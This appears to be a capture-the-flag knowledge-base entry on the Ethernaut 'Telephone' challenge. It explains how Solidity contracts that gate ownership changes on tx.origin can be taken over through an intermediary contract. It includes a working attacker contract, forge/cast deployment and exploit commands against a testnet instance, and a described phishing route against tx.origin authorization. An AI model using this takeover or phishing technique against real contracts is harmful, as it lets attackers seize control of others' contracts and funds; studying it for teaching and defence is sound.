---
id: web3-tx-origin-vs-msgsender-auth-bypass
category: WEB
tags: [web3, blockchain, evm, solidity, tx.origin, msg.sender, authentication, authorization, access-control, auth-bypass, phishing, intermediary-contract, attacker-contract, owner-takeover, changeowner, ethernaut, telephone, foundry, forge, cast]
tools: [Web3]
manuals: ["Manuals/Web3/3. Contexto para Claude.md"]
title: "Web3: tx.origin vs msg.sender check; calling via an intermediary contract breaks the condition (auth bypass)"
difficulty: easy
created: 2026-10-08
updated: 2026-10-08
related: [web3-receive-fallback-weak-access-control, web3-weak-onchain-randomness-blockhash, web3-constructor-typo-exposed-initializer]
---

## How to recognize this pattern

- Any use of **`tx.origin`** in a contract is a red flag. Two symptoms:
  1. **A "only via contract" gate:** `if (tx.origin != msg.sender) { ...privileged action... }`: the
     action only runs when the call comes from **another contract** (a direct EOA call has
     `tx.origin == msg.sender`, the `if` is false and nothing happens).
  2. **Auth by `tx.origin`:** `require(tx.origin == owner)` to authorize, vulnerable to **phishing**:
     a malicious contract the owner is tricked into calling executes the authorized action, because
     `tx.origin` is still the legit owner even mid-chain.
- Key difference: **`tx.origin`** = the EOA that initiated the tx (the origin of the whole chain,
  always counts). **`msg.sender`** = whoever made the **immediate** call (can be an account OR a
  contract).

## Method

Reference case: Ethernaut, Telephone.
```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) { owner = _owner; }   // only changes if called via a contract
}
```
Calling directly from the wallet, `tx.origin == msg.sender` → nothing. Via an intermediary contract,
the Telephone sees `msg.sender = contract` and `tx.origin = you` → `!=` true → you become owner.

### Exploit (intermediary contract + Foundry)

`src/TelephoneAttack.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface ITelephone { function changeOwner(address _owner) external; }
contract TelephoneAttack {
    function attack(address _target, address _newOwner) external {
        ITelephone(_target).changeOwner(_newOwner);   // msg.sender seen by the victim = this contract
    }
}
```
```bash
FORGE=~/.config/.foundry/bin/forge; CAST=~/.config/.foundry/bin/cast
RPC_URL="https://ethereum-sepolia-rpc.publicnode.com"   # Sepolia; $CAST chain-id -> 11155111
PK="<private key, terminal only>"; TARGET="<instance>"; PLAYER="<your EOA>"
$FORGE init . --no-git                                   # Foundry project (empty folder)
$FORGE build                                             # compile before spending gas
$FORGE create src/TelephoneAttack.sol:TelephoneAttack --rpc-url $RPC_URL --private-key $PK --broadcast
ATK=<address "Deployed to:">
$CAST send $ATK "attack(address,address)" $TARGET $PLAYER --rpc-url $RPC_URL --private-key $PK
$CAST call $TARGET "owner()(address)" --rpc-url $RPC_URL  # == $PLAYER -> submit instance
```
The `attack()` call starts from **your EOA** → `tx.origin = you`; the victim sees `msg.sender = contract`.
See `Manuals/Web3/3. Contexto para Claude.md` (toolchain, instance/isSolved/launcher flow).

## Gotchas

- **`forge create` needs an initialized project** (`forge init . --no-git` in an empty folder; it gives
  an obscure "No such file" error if missing). Compile with `$FORGE build` before deploying.
- **"Internal transport error: No such file ... <address>":** `--rpc-url` got a value that isn't a URL
  (e.g. swapped env, `RPC_URL` set to the player's address). Check `echo $RPC_URL`.
- `_newOwner` must be **your EOA** (`$PLAYER`), otherwise you hand ownership to someone else.
- You need Sepolia ETH for gas (deploy + 1 tx). The PK never in chat, not even on a testnet.

## Transferable lesson

See `tx.origin` in a contract? It's almost always **the vulnerability**. Correct authorization uses
`msg.sender`. Two vectors: (1) a `tx.origin != msg.sender` gate → call via an intermediary contract
(one level of indirection already breaks it); (2) `require(tx.origin == X)` → phishing (lure X into
calling your contract, which runs the authorized action). Rule: `tx.origin` is only for knowing the
origin, never for deciding permission.

## Related / Cross-reference

- `Arsenal/WEB/web3-receive-fallback-weak-access-control.md`,
  `web3-constructor-typo-exposed-initializer.md`: other owner takeovers via access control.
- `Manuals/Web3/3. Contexto para Claude.md`: `forge`/`cast`, deploying the attacker contract.
